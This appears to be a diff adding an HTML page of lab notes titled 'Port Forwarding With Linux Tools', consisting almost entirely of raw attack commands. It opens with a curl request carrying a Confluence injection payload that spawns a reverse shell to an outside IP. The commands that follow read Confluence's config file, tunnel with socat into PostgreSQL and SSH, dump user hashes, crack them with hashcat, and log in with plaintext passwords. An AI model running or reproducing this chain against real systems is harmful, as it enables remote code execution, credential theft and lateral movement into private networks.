@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Port Forwarding With Linux Tools</title>
+</head><body>curl -v http://<b>192.168.227.63</b>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.249/1270%200%3E%261%27%29.start%28%29%22%29%7D/ &nbsp; <br/>
+<br/>
+ip addr<br/>
+<br/>
+ip route<br/>
+<br/>
+cat /var/atlassian/application-data/confluence/confluence.cfg.xml<br/>
+<br/>
+socat -ddd TCP-LISTEN:2345,fork TCP:<b>10.4.246.215</b>:5432<br/>
+<br/>
+psql -h <b>192.168.246.63</b>&nbsp; -p 2345 -U postgres<br/>
+<br/>
+D@t4basePassw0rd! &nbsp; <br/>
+<br/>
+\l<br/>
+<br/>
+\c confluence<br/>
+<br/>
+select * from cwd_user;<br/>
+<br/>
+hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt<br/>
+<br/>
+socat TCP-LISTEN:2222,fork TCP:<b>10.4.246.215</b>:22<br/>
+<br/>
+ssh database_admin@<b>192.168.246.63</b>&nbsp;-p2222<br/>
+<br/>
+database_admin = sqlpass123<br/>
+<br/>
+</body></html>
